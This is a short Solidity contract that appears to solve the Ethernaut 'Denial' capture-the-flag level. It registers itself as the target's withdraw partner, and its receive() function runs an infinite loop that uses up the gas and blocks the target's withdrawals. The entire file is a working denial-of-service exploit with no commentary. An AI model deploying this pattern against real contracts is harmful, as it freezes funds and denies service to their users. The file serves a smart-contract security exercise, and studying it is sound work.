// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface Denial {
    function setWithdrawPartner(address) external;
}
contract DenialAttack{

    constructor(address target) {
        Denial level20 = Denial(target);
        level20.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}